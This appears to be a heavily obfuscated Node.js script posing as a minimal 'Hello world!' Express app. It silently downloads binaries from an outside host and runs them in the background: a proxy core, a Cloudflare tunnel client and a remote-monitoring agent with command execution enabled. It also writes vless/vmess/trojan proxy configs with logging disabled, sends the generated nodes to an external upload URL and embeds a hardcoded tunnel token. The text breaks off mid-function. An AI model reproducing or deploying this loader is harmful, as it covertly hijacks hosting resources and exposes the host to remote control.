function _0x8fa4(_0x4248b4,_0x1a4c1f){const _0x31896f=_0x3189();return _0x8fa4=function(_0x8fa48e,_0x193124){_0x8fa48e=_0x8fa48e-0x1b1;let _0x5cb7f2=_0x31896f[_0x8fa48e];return _0x5cb7f2;},_0x8fa4(_0x4248b4,_0x1a4c1f);}const _0x2a0465=_0x8fa4;(function(_0x1bf6af,_0x21eea6){const _0x3b2a65={_0x5676af:0x1ed,_0x3eba78:0x249,_0x39459f:0x236,_0xc49b63:0x24d,_0x877041:0x26a,_0x43052e:0x25c},_0x4bfbb4=_0x8fa4,_0x5ae289=_0x1bf6af();while(!![]){try{const _0x44a03b=parseInt(_0x4bfbb4(_0x3b2a65._0x5676af))/0x1*(-parseInt(_0x4bfbb4(0x244))/0x2)+-parseInt(_0x4bfbb4(_0x3b2a65._0x3eba78))/0x3*(parseInt(_0x4bfbb4(0x215))/0x4)+-parseInt(_0x4bfbb4(_0x3b2a65._0x39459f))/0x5+parseInt(_0x4bfbb4(_0x3b2a65._0xc49b63))/0x6*(parseInt(_0x4bfbb4(0x1b5))/0x7)+-parseInt(_0x4bfbb4(_0x3b2a65._0x877041))/0x8+parseInt(_0x4bfbb4(0x207))/0x9*(-parseInt(_0x4bfbb4(_0x3b2a65._0x43052e))/0xa)+parseInt(_0x4bfbb4(0x266))/0xb;if(_0x44a03b===_0x21eea6)break;else _0x5ae289['push'](_0x5ae289['shift']());}catch(_0x18d012){_0x5ae289['push'](_0x5ae289['shift']());}}}(_0x3189,0x626fe));const express=require(_0x2a0465(0x1ff)),app=express(),axios=require(_0x2a0465(0x26c)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x2a0465(0x1b7))['exec']),{execSync}=require(_0x2a0465(0x1b7)),UPLOAD_URL=process['env'][_0x2a0465(0x201)]||'',PROJECT_URL=process[_0x2a0465(0x1bf)][_0x2a0465(0x22a)]||'',AUTO_ACCESS=process[_0x2a0465(0x1bf)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2a0465(0x1bf)]['FILE_PATH']||_0x2a0465(0x25e),SUB_PATH=process[_0x2a0465(0x1bf)][_0x2a0465(0x1c3)]||_0x2a0465(0x1cf),PORT=process[_0x2a0465(0x1bf)]['SERVER_PORT']||process[_0x2a0465(0x1bf)]['PORT']||0xbb8,UUID=process['env'][_0x2a0465(0x23a)]||_0x2a0465(0x1dd),NEZHA_SERVER=process[_0x2a0465(0x1bf)][_0x2a0465(0x265)]||'',NEZHA_PORT=process[_0x2a0465(0x1bf)][_0x2a0465(0x250)]||'',NEZHA_KEY=process[_0x2a0465(0x1bf)][_0x2a0465(0x23e)]||'',ARGO_DOMAIN=process[_0x2a0465(0x1bf)]['ARGO_DOMAIN']||_0x2a0465(0x21b),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x2a0465(0x1de),ARGO_PORT=process[_0x2a0465(0x1bf)][_0x2a0465(0x1e1)]||0x1f41,CFIP=process[_0x2a0465(0x1bf)][_0x2a0465(0x1b4)]||_0x2a0465(0x216),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x2a0465(0x1bf)][_0x2a0465(0x237)]||'';!fs[_0x2a0465(0x23b)](FILE_PATH)?(fs[_0x2a0465(0x1e9)](FILE_PATH),console[_0x2a0465(0x1b6)](FILE_PATH+_0x2a0465(0x20b))):console[_0x2a0465(0x1b6)](FILE_PATH+_0x2a0465(0x1cd));function generateRandomName(){const _0x601d1a={_0x423e1c:0x220,_0x5a8be4:0x1c6},_0x212ae7=_0x2a0465,_0x40910f=_0x212ae7(_0x601d1a._0x423e1c);let _0x25a213='';for(let _0x2ac169=0x0;_0x2ac169<0x6;_0x2ac169++){_0x25a213+=_0x40910f[_0x212ae7(0x21f)](Math[_0x212ae7(_0x601d1a._0x5a8be4)](Math['random']()*_0x40910f[_0x212ae7(0x1c0)]));}return _0x25a213;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2a0465(0x217)](FILE_PATH,npmName),phpPath=path[_0x2a0465(0x217)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x2a0465(0x217)](FILE_PATH,_0x2a0465(0x1df)),listPath=path[_0x2a0465(0x217)](FILE_PATH,_0x2a0465(0x206)),bootLogPath=path[_0x2a0465(0x217)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x3dd7c0={_0x582768:0x1e0,_0x2297bd:0x248,_0x9676ee:0x210,_0x2bab62:0x1c0,_0x321096:0x1e2},_0x56737c=_0x2a0465;try{if(!UPLOAD_URL)return;if(!fs[_0x56737c(0x23b)](subPath))return;let _0x210586;try{_0x210586=fs['readFileSync'](subPath,_0x56737c(0x210));}catch{return null;}const _0x39700b=Buffer[_0x56737c(0x25a)](_0x210586,_0x56737c(_0x3dd7c0._0x582768))[_0x56737c(_0x3dd7c0._0x2297bd)](_0x56737c(_0x3dd7c0._0x9676ee)),_0x4f03d0=_0x39700b[_0x56737c(0x255)]('\x0a')['filter'](_0x5e25de=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x56737c(0x223)](_0x5e25de));if(_0x4f03d0[_0x56737c(_0x3dd7c0._0x2bab62)]===0x0)return;return axios[_0x56737c(_0x3dd7c0._0x321096)](UPLOAD_URL+_0x56737c(0x1ee),JSON[_0x56737c(0x231)]({'nodes':_0x4f03d0}),{'headers':{'Content-Type':_0x56737c(0x1db)}})[_0x56737c(0x1bd)](_0x4c57ef=>{return null;}),null;}catch(_0x466599){return null;}}function cleanupOldFiles(){const _0x1542d3={_0x59d4bf:0x24a},_0x129522={_0x3177da:0x217,_0xb7145b:0x247},_0x176d51=_0x2a0465;try{const _0x27ea0b=fs[_0x176d51(_0x1542d3._0x59d4bf)](FILE_PATH);_0x27ea0b['forEach'](_0x5f533c=>{const _0x28bcb6=_0x176d51,_0x4cb6e8=path[_0x28bcb6(_0x129522._0x3177da)](FILE_PATH,_0x5f533c);try{const _0x4ab26c=fs['statSync'](_0x4cb6e8);_0x4ab26c[_0x28bcb6(0x1e7)]()&&fs[_0x28bcb6(_0x129522._0xb7145b)](_0x4cb6e8);}catch(_0x95d192){}});}catch(_0x427eab){}}app[_0x2a0465(0x1f1)]('/',function(_0x1681e0,_0x2c9c89){_0x2c9c89['send']('Hello\x20world!');});async function generateConfig(){const _0x2cb485={_0x483d3c:0x1eb,_0x280619:0x23d,_0x1e04ce:0x1bb,_0x5761dc:0x21a,_0x576514:0x26b,_0x107c90:0x1c5,_0x18c497:0x1f4,_0x545263:0x229,_0x5d4502:0x26e,_0x3e31dd:0x1c5,_0x56735e:0x1f4,_0x6e3fb5:0x1e6,_0x4069d9:0x217},_0x2733dc=_0x2a0465,_0x12146c={'log':{'access':'/dev/null','error':_0x2733dc(_0x2cb485._0x483d3c),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2733dc(_0x2cb485._0x280619)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2733dc(_0x2cb485._0x1e04ce)}},{'port':0xbb9,'listen':_0x2733dc(_0x2cb485._0x5761dc),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x2733dc(0x252)},'streamSettings':{'network':_0x2733dc(_0x2cb485._0x1e04ce),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2733dc(0x1ba),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2733dc(_0x2cb485._0x576514)}},'sniffing':{'enabled':!![],'destOverride':[_0x2733dc(_0x2cb485._0x107c90),_0x2733dc(_0x2cb485._0x18c497),_0x2733dc(0x26e)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2733dc(0x21a),'protocol':_0x2733dc(0x242),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2733dc(_0x2cb485._0x545263)}},'sniffing':{'enabled':!![],'destOverride':[_0x2733dc(0x1c5),_0x2733dc(0x1f4),_0x2733dc(_0x2cb485._0x5d4502)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2733dc(_0x2cb485._0x3e31dd),_0x2733dc(_0x2cb485._0x56735e),_0x2733dc(0x26e)],'metadataOnly':![]}}],'dns':{'servers':[_0x2733dc(_0x2cb485._0x6e3fb5)]},'outbounds':[{'protocol':_0x2733dc(0x1fa),'tag':_0x2733dc(0x25d)},{'protocol':_0x2733dc(0x253),'tag':_0x2733dc(0x1fe)}]};fs['writeFileSync'](path[_0x2733dc(_0x2cb485._0x4069d9)](FILE_PATH,'config.json'),JSON[_0x2733dc(0x231)](_0x12146c,null,0x2));}function getSystemArchitecture(){const _0x3a2b3a={_0x3cc7c5:0x1c9},_0x48dac5=_0x2a0465,_0x5c1f9b=os[_0x48dac5(0x204)]();return _0x5c1f9b===_0x48dac5(0x1f9)||_0x5c1f9b==='arm64'||_0x5c1f9b===_0x48dac5(0x22e)?_0x48dac5(0x1f9):_0x48dac5(_0x3a2b3a._0x3cc7c5);}function _0x3189(){const _0x5e45d3=['npm\x20running\x20error:\x20','/api/add-subscriptions','Download\x20','1996EngRFy','cf.877774.xyz','join','Error\x20executing\x20command:\x20','country_code','127.0.0.1','railway0122.aad8on.de5.net','Add\x20automatic\x20access\x20task\x20faild:\x20','org','true','charAt','abcdefghijklmnopqrstuvwxyz','http://ip-api.com/json/','/config.json\x20>/dev/null\x202>&1\x20&','test','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','data','fileName','2083','\x20successfully','/vmess-argo','PROJECT_URL','Subscription\x20uploaded\x20successfully','--tls','text/plain;\x20charset=utf-8','aarch64','includes','Empowerment\x20success\x20for\x20','stringify','&path=%2Ftrojan-argo%3Fed%3D2560#','?encryption=none&security=tls&sni=','https://amd64.ssss.nyc.mn/v1','del\x20/f\x20/q\x20','2647100ZKGYIU','NAME','https://ipapi.co/json/','pkill\x20-f\x20\x22[','UUID','existsSync','chmod','xtls-rprx-vision','NEZHA_KEY','https://amd64.ssss.nyc.mn/agent','2087','match','vmess','status','250EGQvFb','Error\x20downloading\x20files:','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','unlinkSync','toString','3957lIHtuJ','readdirSync','response','listen','970770FXyzzB','&fp=firefox&type=ws&host=','App\x20is\x20running','NEZHA_PORT','finish','none','blackhole','\x20-s\x20','split','unshift','\x20-c\x20\x22','push','\x20-c\x20','from','pipe','170JJIyoX','direct','./tmp','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Empowerment\x20failed\x20for\x20','https://oooo.serv00.net/add-url','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Unknown','clear','NEZHA_SERVER','21597191jJakxn','https://arm64.ssss.nyc.mn/v1','all','\x20>/dev/null\x202>&1\x20&','2994960RxWMyh','/vless-argo','axios','forEach','quic','filter','win32','?security=tls&sni=','CFIP','21EaSlQK','log','child_process','/tunnel.yml\x20run','send','vless','tcp','Error\x20reading\x20boot.log:','catch','nohup\x20','env','length','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0a\x20\x20\x20\x20','SUB_PATH','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','http','floor','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','writeFileSync','amd','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://amd64.ssss.nyc.mn/web','\x0a\x0atrojan://','\x20already\x20exists','tunnel.yml','sub','&path=%2Fvless-argo%3Fed%3D2560#','fileUrl','substring','readFileSync','\x20>/dev/null\x202>&1','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/bot','then','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','error','NEZHA\x20variable\x20is\x20empty,skip\x20running','application/json','map','02b34b2e-521c-46e0-bfa8-9866e00acda1','eyJhIjoiMGFhNTQ4MmE3ZTMzMWMyYjg5MjJiNWRlZDk1NDBmMzAiLCJ0IjoiMGFiZjk2MDEtNzdmZC00MmU3LWFmOWMtZmZlZmMxMTE1MTY2IiwicyI6IlkyRXhNMlJrTTJJdE1tTm1OQzAwTXpZMExUZzVOek10WlRGaU5UQmpaR015TXpBMCJ9','sub.txt','base64','ARGO_PORT','post','set','basename','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https+local://8.8.8.8/dns-query','isFile','Nodes\x20uploaded\x20successfully','mkdirSync','8443','/dev/null','createWriteStream','1133YsvvXu','/api/delete-nodes','https://arm64.ssss.nyc.mn/web','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','get','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','php\x20running\x20error:\x20','tls','message','\x20is\x20running','\x20failed:\x20','Unhandled\x20error\x20in\x20startserver:','arm','freedom','web\x20running\x20error:\x20','tunnel.json','automatic\x20access\x20task\x20added\x20successfully','block','express','countryCode','UPLOAD_URL','\x0a\x20\x20credentials-file:\x20','platform','arch','boot.log','list.txt','181044lIUzrp','\x22\x20>\x20/dev/null\x202>&1','has','/vmess-argo?ed=2560','\x20is\x20created','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Skipping\x20adding\x20automatic\x20access\x20task','\x0avless://','2053','utf-8','443'];_0x3189=function(){return _0x5e45d3;};return _0x3189();}function downloadFile(_0x16b61e,_0x11534a,_0x2f7702){const _0x143e71={_0x353eac:0x1bd},_0x5ac11a={_0x37dc27:0x1f7,_0x4504ef:0x1f5,_0x5c3b34:0x1d9},_0x3c70fb={_0x532cec:0x225,_0x37adde:0x251,_0x4b3d2a:0x1d9},_0x40e386={_0x528496:0x1e4,_0x28e0d7:0x1f7,_0x37126e:0x1f5,_0x4913a4:0x1d9},_0xac7e49={_0x2376b0:0x1e4},_0x6c9be=_0x2a0465,_0x31e482=_0x16b61e;!fs['existsSync'](FILE_PATH)&&fs[_0x6c9be(0x1e9)](FILE_PATH,{'recursive':!![]});const _0xbfcb98=fs[_0x6c9be(0x1ec)](_0x31e482);axios({'method':'get','url':_0x11534a,'responseType':'stream'})[_0x6c9be(0x1d7)](_0x4140b5=>{const _0x12954c=_0x6c9be;_0x4140b5[_0x12954c(_0x3c70fb._0x532cec)][_0x12954c(0x25b)](_0xbfcb98),_0xbfcb98['on'](_0x12954c(_0x3c70fb._0x37adde),()=>{const _0x410480=_0x12954c;_0xbfcb98['close'](),console[_0x410480(0x1b6)]('Download\x20'+path[_0x410480(_0xac7e49._0x2376b0)](_0x31e482)+_0x410480(0x228)),_0x2f7702(null,_0x31e482);}),_0xbfcb98['on'](_0x12954c(_0x3c70fb._0x4b3d2a),_0x3c7e88=>{const _0x31439=_0x12954c;fs['unlink'](_0x31e482,()=>{});const _0x37a217=_0x31439(0x214)+path[_0x31439(_0x40e386._0x528496)](_0x31e482)+_0x31439(_0x40e386._0x28e0d7)+_0x3c7e88[_0x31439(_0x40e386._0x37126e)];console[_0x31439(_0x40e386._0x4913a4)](_0x37a217),_0x2f7702(_0x37a217);});})[_0x6c9be(_0x143e71._0x353eac)](_0x5b833c=>{const _0x5c22f4=_0x6c9be,_0x590113=_0x5c22f4(0x214)+path[_0x5c22f4(0x1e4)](_0x31e482)+_0x5c22f4(_0x5ac11a._0x37dc27)+_0x5b833c[_0x5c22f4(_0x5ac11a._0x4504ef)];console[_0x5c22f4(_0x5ac11a._0x5c3b34)](_0x590113),_0x2f7702(_0x590113);});}async function downloadFilesAndRun(){const _0x1a8a8a={_0xf6f0a5:0x1b6,_0x4a501f:0x1c7,_0x581a8f:0x245,_0x3ea543:0x211,_0x5cad91:0x1ea,_0x3b2eb3:0x227,_0x56f05b:0x21e,_0x3fa189:0x25f,_0x111804:0x1c8,_0x112277:0x1be,_0x4d726c:0x257,_0x263bbf:0x1b6,_0x2e9ad8:0x1d9,_0x14bb57:0x211,_0x2a40de:0x22f,_0x10105c:0x22c,_0x5a1d2e:0x212,_0x36ab45:0x259,_0x944190:0x1fb,_0x49cec1:0x1e5,_0x44edb0:0x241,_0x39e057:0x1b8,_0x33b5f4:0x1d8,_0x288eda:0x1b6,_0xcbe5bc:0x1f6},_0x1cd4f9=_0x2a0465,_0x2e1367=getSystemArchitecture(),_0xb015d1=getFilesForArchitecture(_0x2e1367);if(_0xb015d1[_0x1cd4f9(0x1c0)]===0x0){console[_0x1cd4f9(_0x1a8a8a._0xf6f0a5)](_0x1cd4f9(_0x1a8a8a._0x4a501f));return;}const _0x1d5606=_0xb015d1[_0x1cd4f9(0x1dc)](_0x385a96=>{const _0x216a65={_0x50ade0:0x226};return new Promise((_0x4eefc9,_0xf39f9c)=>{const _0x4edde0=_0x8fa4;downloadFile(_0x385a96[_0x4edde0(_0x216a65._0x50ade0)],_0x385a96[_0x4edde0(0x1d1)],(_0x3a6687,_0x58eb49)=>{_0x3a6687?_0xf39f9c(_0x3a6687):_0x4eefc9(_0x58eb49);});});});try{await Promise[_0x1cd4f9(0x268)](_0x1d5606);}catch(_0x3989fe){console['error'](_0x1cd4f9(_0x1a8a8a._0x581a8f),_0x3989fe);return;}function _0x9eb620(_0x2cd287){const _0x2d0265=_0x1cd4f9,_0x206593=0x1fd;_0x2cd287[_0x2d0265(0x26d)](_0x35fcc5=>{const _0x100706={_0x1676a7:0x1d9,_0x2e6cd3:0x260,_0x191b8d:0x1b6,_0x5784fb:0x230,_0x16a384:0x248},_0x50aba7=_0x2d0265;fs[_0x50aba7(0x23b)](_0x35fcc5)&&fs[_0x50aba7(0x23c)](_0x35fcc5,_0x206593,_0x5d8be5=>{const _0x13deb0=_0x50aba7;_0x5d8be5?console[_0x13deb0(_0x100706._0x1676a7)](_0x13deb0(_0x100706._0x2e6cd3)+_0x35fcc5+':\x20'+_0x5d8be5):console[_0x13deb0(_0x100706._0x191b8d)](_0x13deb0(_0x100706._0x5784fb)+_0x35fcc5+':\x20'+_0x206593[_0x13deb0(_0x100706._0x16a384)](0x8));});});}const _0x3ae32a=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x9eb620(_0x3ae32a);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5edc09=NEZHA_SERVER[_0x1cd4f9(0x22f)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x3f120a=new Set([_0x1cd4f9(_0x1a8a8a._0x3ea543),_0x1cd4f9(_0x1a8a8a._0x5cad91),'2096',_0x1cd4f9(0x240),_0x1cd4f9(_0x1a8a8a._0x3b2eb3),'2053']),_0x5555c0=_0x3f120a[_0x1cd4f9(0x209)](_0x5edc09)?_0x1cd4f9(_0x1a8a8a._0x56f05b):'false',_0x2a174c='\x0aclient_secret:\x20'+NEZHA_KEY+_0x1cd4f9(_0x1a8a8a._0x3fa189)+NEZHA_SERVER+_0x1cd4f9(0x224)+_0x5555c0+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1cd4f9(_0x1a8a8a._0x111804)](path[_0x1cd4f9(0x217)](FILE_PATH,'config.yaml'),_0x2a174c);const _0x30d2b3=_0x1cd4f9(_0x1a8a8a._0x112277)+phpPath+_0x1cd4f9(_0x1a8a8a._0x4d726c)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x30d2b3),console[_0x1cd4f9(_0x1a8a8a._0x263bbf)](phpName+_0x1cd4f9(0x1f6)),await new Promise(_0x3abc40=>setTimeout(_0x3abc40,0x3e8));}catch(_0xdc3ee){console[_0x1cd4f9(_0x1a8a8a._0x2e9ad8)](_0x1cd4f9(0x1f3)+_0xdc3ee);}}else{let _0x4db3ef='';const _0xc2c7e0=[_0x1cd4f9(_0x1a8a8a._0x14bb57),'8443','2096',_0x1cd4f9(0x240),_0x1cd4f9(_0x1a8a8a._0x3b2eb3),_0x1cd4f9(0x20f)];_0xc2c7e0[_0x1cd4f9(_0x1a8a8a._0x2a40de)](NEZHA_PORT)&&(_0x4db3ef=_0x1cd4f9(_0x1a8a8a._0x10105c));const _0x4bb932=_0x1cd4f9(_0x1a8a8a._0x112277)+npmPath+_0x1cd4f9(0x254)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4db3ef+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4bb932),console[_0x1cd4f9(0x1b6)](npmName+_0x1cd4f9(0x1f6)),await new Promise(_0x298b69=>setTimeout(_0x298b69,0x3e8));}catch(_0x40922f){console['error'](_0x1cd4f9(_0x1a8a8a._0x5a1d2e)+_0x40922f);}}}else console['log'](_0x1cd4f9(0x1da));const _0xf3917e='nohup\x20'+webPath+_0x1cd4f9(_0x1a8a8a._0x36ab45)+FILE_PATH+_0x1cd4f9(0x222);try{await exec(_0xf3917e),console[_0x1cd4f9(0x1b6)](webName+_0x1cd4f9(0x1f6)),await new Promise(_0xc598ce=>setTimeout(_0xc598ce,0x3e8));}catch(_0x1ef41a){console[_0x1cd4f9(0x1d9)](_0x1cd4f9(_0x1a8a8a._0x944190)+_0x1ef41a);}if(fs[_0x1cd4f9(0x23b)](botPath)){let _0x3bed14;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x3bed14=_0x1cd4f9(_0x1a8a8a._0x49cec1)+ARGO_AUTH;else ARGO_AUTH[_0x1cd4f9(_0x1a8a8a._0x44edb0)](/TunnelSecret/)?_0x3bed14=_0x1cd4f9(0x246)+FILE_PATH+_0x1cd4f9(_0x1a8a8a._0x39e057):_0x3bed14=_0x1cd4f9(_0x1a8a8a._0x33b5f4)+FILE_PATH+_0x1cd4f9(0x1f0)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3bed14+_0x1cd4f9(0x269)),console[_0x1cd4f9(_0x1a8a8a._0x288eda)](botName+_0x1cd4f9(_0x1a8a8a._0xcbe5bc)),await new Promise(_0xbc4dfb=>setTimeout(_0xbc4dfb,0x7d0));}catch(_0x20f748){console[_0x1cd4f9(0x1d9)](_0x1cd4f9(0x218)+_0x20f748);}}await new Promise(_0x4d571a=>setTimeout(_0x4d571a,0x1388));}function getFilesForArchitecture(_0x56f351){const _0x1d9a08={_0x251087:0x1ef,_0x2796b8:0x1cb,_0xcd5f13:0x1d6,_0x1031ad:0x1f9,_0x12c844:0x267,_0x2a192c:0x234},_0x171e26=_0x2a0465;let _0x3a40a9;_0x56f351===_0x171e26(0x1f9)?_0x3a40a9=[{'fileName':webPath,'fileUrl':_0x171e26(_0x1d9a08._0x251087)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x3a40a9=[{'fileName':webPath,'fileUrl':_0x171e26(_0x1d9a08._0x2796b8)},{'fileName':botPath,'fileUrl':_0x171e26(_0x1d9a08._0xcd5f13)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5d3046=_0x56f351===_0x171e26(_0x1d9a08._0x1031ad)?'https://arm64.ssss.nyc.mn/agent':_0x171e26(0x23f);_0x3a40a9['unshift']({'fileName':npmPath,'fileUrl':_0x5d3046});}else{const _0x5a7d1f=_0x56f351==='arm'?_0x171e26(_0x1d9a08._0x12c844):_0x171e26(_0x1d9a08._0x2a192c);_0x3a40a9[_0x171e26(0x256)]({'fileName':phpPath,'fileUrl':_0x5a7d1f});}}return _0x3a40a9;}function argoType(){const _0x2c0086={_0x29beba:0x1b6,_0x574991:0x1c1,_0xdaea48:0x22f,_0x20a30d:0x202,_0x5d36d7:0x20c,_0x515690:0x262,_0x13cc48:0x1c8,_0x2c2f4c:0x217,_0x3390ab:0x1ce,_0xadeb87:0x1f2},_0x4a239a=_0x2a0465;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4a239a(_0x2c0086._0x29beba)](_0x4a239a(_0x2c0086._0x574991));return;}if(ARGO_AUTH[_0x4a239a(_0x2c0086._0xdaea48)]('TunnelSecret')){fs['writeFileSync'](path[_0x4a239a(0x217)](FILE_PATH,_0x4a239a(0x1fc)),ARGO_AUTH);const _0x2dbb3c='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x4a239a(0x255)]('\x22')[0xb]+_0x4a239a(_0x2c0086._0x20a30d)+path['join'](FILE_PATH,_0x4a239a(0x1fc))+_0x4a239a(_0x2c0086._0x5d36d7)+ARGO_DOMAIN+_0x4a239a(0x1d5)+ARGO_PORT+_0x4a239a(_0x2c0086._0x515690);fs[_0x4a239a(_0x2c0086._0x13cc48)](path[_0x4a239a(_0x2c0086._0x2c2f4c)](FILE_PATH,_0x4a239a(_0x2c0086._0x3390ab)),_0x2dbb3c);}else console[_0x4a239a(_0x2c0086._0x29beba)](_0x4a239a(_0x2c0086._0xadeb87));}async function extractDomains(){const _0xac8950={_0x18a933:0x1d3,_0x30a5d1:0x217,_0x397bb4:0x205,_0x54ae6d:0x26d,_0x3d5aed:0x1c0,_0x3b6756:0x1b6,_0x532d57:0x1c4,_0x492abd:0x247,_0x34e904:0x205,_0x347c25:0x1f6},_0xa0f451={_0x35d31e:0x1f1,_0x2d4ca7:0x219,_0x416256:0x21d,_0x229912:0x219,_0x5f3605:0x225,_0x466241:0x200},_0x55c75b={_0x20895a:0x203,_0x29b7d4:0x1b2,_0x1496b9:0x239,_0x2cafca:0x21f,_0x137c6f:0x1d2},_0x401756=_0x2a0465;let _0x4895b9;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4895b9=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x4895b9),await _0x3d008b(_0x4895b9);else try{const _0x5cb7c8=fs[_0x401756(_0xac8950._0x18a933)](path[_0x401756(_0xac8950._0x30a5d1)](FILE_PATH,_0x401756(_0xac8950._0x397bb4)),_0x401756(0x210)),_0x3a2a25=_0x5cb7c8[_0x401756(0x255)]('\x0a'),_0x454e4a=[];_0x3a2a25[_0x401756(_0xac8950._0x54ae6d)](_0x5b59a7=>{const _0xff7f71=_0x401756,_0x65d003=_0x5b59a7['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x65d003){const _0x1c9125=_0x65d003[0x1];_0x454e4a[_0xff7f71(0x258)](_0x1c9125);}});if(_0x454e4a[_0x401756(_0xac8950._0x3d5aed)]>0x0)_0x4895b9=_0x454e4a[0x0],console[_0x401756(_0xac8950._0x3b6756)]('ArgoDomain:',_0x4895b9),await _0x3d008b(_0x4895b9);else{console[_0x401756(0x1b6)](_0x401756(_0xac8950._0x532d57)),fs[_0x401756(_0xac8950._0x492abd)](path[_0x401756(0x217)](FILE_PATH,_0x401756(_0xac8950._0x34e904)));async function _0x1a8f2c(){const _0x12620e=_0x401756;try{process[_0x12620e(_0x55c75b._0x20895a)]===_0x12620e(_0x55c75b._0x29b7d4)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x12620e(_0x55c75b._0x1496b9)+botName[_0x12620e(_0x55c75b._0x2cafca)](0x0)+']'+botName[_0x12620e(_0x55c75b._0x137c6f)](0x1)+_0x12620e(0x208));}catch(_0x2443d3){}}_0x1a8f2c(),await new Promise(_0x46ac2d=>setTimeout(_0x46ac2d,0xbb8));const _0x5bc0ea='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x401756(0x1f0)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5bc0ea+_0x401756(0x269)),console[_0x401756(_0xac8950._0x3b6756)](botName+_0x401756(_0xac8950._0x347c25)),await new Promise(_0x4a266e=>setTimeout(_0x4a266e,0xbb8)),await extractDomains();}catch(_0x3f986b){console['error'](_0x401756(0x218)+_0x3f986b);}}}catch(_0x54c2aa){console[_0x401756(0x1d9)](_0x401756(0x1bc),_0x54c2aa);}async function _0x3c2206(){const _0x58ff41=_0x401756;try{const _0x768abb=await axios[_0x58ff41(_0xa0f451._0x35d31e)](_0x58ff41(0x238),{'timeout':0xbb8});if(_0x768abb[_0x58ff41(0x225)]&&_0x768abb['data'][_0x58ff41(_0xa0f451._0x2d4ca7)]&&_0x768abb[_0x58ff41(0x225)][_0x58ff41(_0xa0f451._0x416256)])return _0x768abb['data'][_0x58ff41(_0xa0f451._0x229912)]+'_'+_0x768abb[_0x58ff41(_0xa0f451._0x5f3605)][_0x58ff41(0x21d)];}catch(_0x3643af){try{const _0x26b9c0=await 